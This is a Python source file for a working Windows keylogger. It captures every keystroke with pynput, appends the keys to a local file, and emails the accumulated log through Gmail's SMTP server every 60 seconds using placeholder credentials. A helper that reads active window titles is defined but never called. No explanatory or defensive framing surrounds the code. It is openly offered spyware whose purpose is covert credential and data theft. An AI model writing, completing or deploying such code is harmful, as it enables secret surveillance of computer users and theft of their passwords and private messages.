import os
import smtplib
import threading
import time
from datetime import datetime
from pynput import keyboard
import win32gui

LOG_FILE = "keylog.txt"
EMAIL = "your_email@gmail.com"  # Replace with your email
PASSWORD = "your_password"  # Use an app password (recommended)

log = ""
last_window = ""

def send_email():
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL, PASSWORD)
            server.sendmail(EMAIL, EMAIL, log)
            server.quit()
            log = ""  # Clear log after sending
        except Exception as e:
            print(f"Error sending email: {e}")

def get_active_window():
    global last_window
    hwnd = win32gui.GetForegroundWindow()
    window_title = win32gui.GetWindowText(hwnd)
    if window_title and window_title != last_window:
        last_window = window_title
        return f"\n[{datetime.now()}] Active Window: {window_title}\n"
    return ""

def log_key(key):
    global log
    try:
        char = key.char
    except AttributeError:
        char = str(key)

    if char == "Key.space":
        char = " "
    elif char == "Key.enter":
        char = "\n"
    elif char == "Key.backspace":
        log = log[:-1]  # Remove last character instead of adding [BACKSPACE]
        return  # Prevents adding unnecessary logs

    log += char
    with open(LOG_FILE, "a") as f:
        f.write(char)

def key_listener():
    with keyboard.Listener(on_press=log_key) as listener:
        listener.join()

def email_thread():
    while True:
        time.sleep(60)  # Send logs every 60 seconds
        send_email()

if __name__ == "__main__":
    threading.Thread(target=key_listener, daemon=True).start()
    threading.Thread(target=email_thread, daemon=True).start()
    while True:
        time.sleep(10)
